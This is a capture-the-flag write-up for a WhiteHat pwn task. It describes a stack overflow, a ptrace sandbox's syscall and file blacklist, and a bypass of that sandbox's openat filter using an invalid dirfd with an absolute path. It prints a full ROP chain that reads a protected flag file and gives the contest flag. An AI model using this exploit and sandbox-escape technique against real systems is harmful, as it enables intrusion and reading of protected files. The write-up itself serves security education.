# pwn01 (pwn, 34 solved, 160p) 

## Introduction

In this task we have a binary to pwn but this task differs slightly from other
pwns i a way that it runs under sandbox. 
You can download all sources for this task [here](forPlayer.zip).
For sandbox is providen binary and also sources.

## Vulnerability and exploitation

I didn't reverse full binary because simple vulnerability could be found at the beginning
of execution process.

in main():

```C
  printf("Oh Hi what do you want %s?? \n\n", my_name);
  while ( 1 )
  {
    show_menu();
    v3 = get_int_from_user();
```

```C
__int64 get_int_from_user()
{
  char nptr; // [rsp+0h] [rbp-10h]
  int v2; // [rsp+Ch] [rbp-4h]

  big_buffer_overflow(&nptr, 4);
  v2 = atoi(&nptr);
  if ( v2 <= 0 || v2 > 256 )
    you_touched_rule_exit();
  return (unsigned int)v2;
}
```

```
__int64 __fastcall big_buffer_overflow(const char *buf, int max_size)
{
  size_t buflen; // rdx
  __int64 result; // rax

  __isoc99_scanf("%s", buf);
  buf[strlen(buf)] = 0;                         // this doesn't make any sense, it changes nothing
  buflen = strlen(buf);
  result = max_size;
  if ( buflen > max_size )                      // Their own stack canary that was written at the source level - not added by the compiler.
    you_touched_rule_exit();
  return result;
}
```
`you_touched_rule_exit` is a function that prints a message and exits.
We can bypass their "stack canary" by sending null byte at the posion max small or lower.

This is not the first vulnerability that can be triggered when binary runs, but the first one makes some ascii checks - 
there is a blacklist of bad letters so I choose this vulnerability to exploit because of the convenience.

So it's a simple buffer overflow on the stack, also there are no problems with gadgets as long as we want calling syscalls with maximum number of 3 arguments.

We have following set of gadgets:

```
0x0000000000002254: syscall; ret;
0x000000000000225f: pop rdi; ret;
0x0000000000002261: pop rsi; ret;
0x0000000000002267: pop rax; ret;
0x0000000000002265: pop rdx; ret;
```

This set of gadgets allows us to write ROP without any effort.

## Sandbox bypass

This sandbox i based on ptrace linux's API. It "hooks" syscalls and checks if its blaclisted.
We can get acquainted with the list of syscalls not permitted by reading a file named `blacklist.conf`

```
7
56
57
58
59
62
200
234
1
/home/gift/flag.txt
```

We know at this point that flag is placed at `/home/gift/flag.txt` .

It means that the following list of syscalls is blacklisted without any exceptions:

```
poll
fork
vfork
execve
kill
tkill
tgkill
```

It's not all, when you get acquainted with the source code of the sandbox you can see that `open` and `openat` are disallowed when their arguments match the criteria.

```C

bool fileInBlackList(const string& fname) 
{
    // Simple regular expression matching
	char actualpath[PATH_MAX+1];
	if(realpath(fname.c_str(), actualpath)) {
		gLog.log("Open file: ", false); gLog.log(actualpath);
		for(int i = 0; i < global_black_files.size(); ++i) {
			regex txt_regex(global_black_files[i], regex_constants::basic);
			if(regex_match(actualpath, txt_regex)) {
				return true;
			}
		}
	}
	return false;
}

...


if (sysCall == SYSCALL_OPEN) { // open
	string filePath = getCString(global_child_id, regs.rdi);
	if (fileInBlackList(filePath)) {
		gLog.log("Violation detected: opening file ", false); gLog.log(filePath);
		mKillChild();
		exitCode = EXIT_CODE_VIOLATION;
		break; // do not allow syscall to finish
	}
} else if (sysCall == SYSCALL_OPENAT) { // openat
	int dfd = regs.rdi;
	char actualpath[PATH_MAX+1];
	string fdPath = "/proc/";
	fdPath += to_string(global_child_id);
	fdPath += "/fd/";
	fdPath += to_string(dfd);
	memset(actualpath, 0, sizeof(actualpath));
	if (-1 != readlink(fdPath.c_str(), actualpath, sizeof(actualpath))) {
		string path = actualpath;
		path += "/";
		path += getCString(global_child_id, regs.rsi);
		if (fileInBlackList(path)) {
			gLog.log("Violation detected: opening file ", false); gLog.log(path);
			mKillChild();
			exitCode = EXIT_CODE_VIOLATION;
			break; // do not allow syscall to finish
		}
	} else {
		// false dfd
	}
}
```

Firslty, I analysed only `open` from both of these filters and at this point I had the idea:

[Realpath man](http://man7.org/linux/man-pages/man3/realpath.3.html) states:

```
realpath() expands all symbolic links and resolves references to /./,
       /../ and extra '/' characters
```

but we have 2 types of links in Linux:

- Symbolic link - symlink syscall
- Hard link - link syscall

and realpath expands only symbolic links.

I've made a simple test in C:

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	symlink("/home/gift/flag.txt","link");
	char * a = realpath("link",NULL);
	printf("%s\n",a);
	return 0;
}
```

```
a@x:/home/gift$ ./test
/home/gift/flag.txt
```

```C
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main()
{
	link("/home/gift/flag.txt","link");
	char * a = realpath("link",NULL);
	printf("%s\n",a);
	return 0;
} 
```

```
a@x:/home/gift$ rm -f link
a@x:/home/gift$ ./test
/home/gift/link
```

It proves what man page claims.

So I created ROP to make symlink first, and then opens this link and reads the content of this file.
It worked on my localhost, but didn't on remote sorver.

I've tried to write symlink to `home folder`, `/tmp` and `/dev/shm` and my exploit never worked.
It turned out that these folders were not writable.

I decided to go different way.

I've read a part of the code that is responsible for filtering `openat` now and found out:

```
int openat(int dirfd, const char *pathname, int flags);

...

If the pathname given in pathname is relative, then it is interpreted relative to the directory referred to by the file descriptor dirfd (rather than relative to the current working directory of the calling process, as is done by open(2) for a relative pathname).

...

If pathname is absolute, then dirfd is ignored.

```

Our sandbox reads `dirfd` into `dfd` variable - `int dfd = regs.rdi;`

then It makes concatenation of strings "/proc/"+str(sandboxed binary pid)+"/fd/"+str(dfd)

later it does:


```C
if (-1 != readlink(fdPath.c_str(), actualpath, sizeof(actualpath))) {
```

and here is the vulnerability - when readlink returns `-1` the sandbox goes ahead and doesn't make any filtering.
By proving an odd number like 0x100 will make readlink fail because there is no file descriptor of this number at our process. 
But when `pathname` argument is absolute this value is ommited inside of the syscall.

That's how we can bypass our sandbox.

The full ROP is below:

```
#read(stdin, FLAG_PATH_ADDR, bignum)
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_read)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x0) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(FLAG_PATH_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(len(FLAG_PATH)+1)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#openat(100, FLAG_PATH_ADDR, 0)
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_openat)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x100) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(FLAG_PATH_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x0)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#read(6, DATA_ADR, 0x9999) 
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_read)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x4) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(DATA_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x9999)
payload += p64(0x0000000000002254 + base) # syscall; ret;

#write(1, DATA_ADR, 0x1000) 
payload += p64(0x0000000000002267 + base) #: pop rax; ret;
payload += p64(constants.SYS_write)
payload += p64(0x000000000000225f + base) #: pop rdi; ret;
payload += p64(0x1) #fildes
payload += p64(0x0000000000002261 + base) #: pop rsi; ret;
payload += p64(DATA_ADDR)
payload += p64(0x0000000000002265 + base) #: pop rdx; ret;
payload += p64(0x100)
payload += p64(0x0000000000002254 + base) # syscall; ret;
```

Note that first we do read() to read from stdin path to the flag - it's not present in our binary.

The full exploit is [here](exploit.py)

The flag is `WhiteHat{aeb7656b7a397a01c0d9d19fba3a81352e9b21aa}`


